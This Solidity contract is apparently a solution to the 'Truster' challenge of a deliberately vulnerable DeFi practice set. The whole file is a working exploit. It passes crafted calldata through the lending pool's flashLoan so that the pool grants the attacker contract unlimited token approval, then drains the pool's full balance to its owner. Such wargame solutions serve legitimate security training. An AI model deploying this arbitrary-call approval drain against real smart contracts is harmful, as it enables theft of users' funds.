// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";
import "hardhat/console.sol";

contract AttackTruster is Ownable{

    TrusterLenderPool private immutable pool;
    IERC20 public immutable damnValuableToken;

    constructor (address trustLendPool,address tokenAddress) {
        pool = TrusterLenderPool(trustLendPool);
        damnValuableToken = IERC20(tokenAddress);
    }

    function attack() public onlyOwner {

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), type(uint256).max
        );

        pool.flashLoan(0, address(this), address(damnValuableToken), data);

        uint256 tokenBalance = damnValuableToken.balanceOf(address(pool));
        damnValuableToken.transferFrom(address(pool), address(this), tokenBalance);

    }

    function withdraw() public onlyOwner {
        uint256 tokenBalance = damnValuableToken.balanceOf(address(this));
        damnValuableToken.transfer(msg.sender, tokenBalance);
    }
}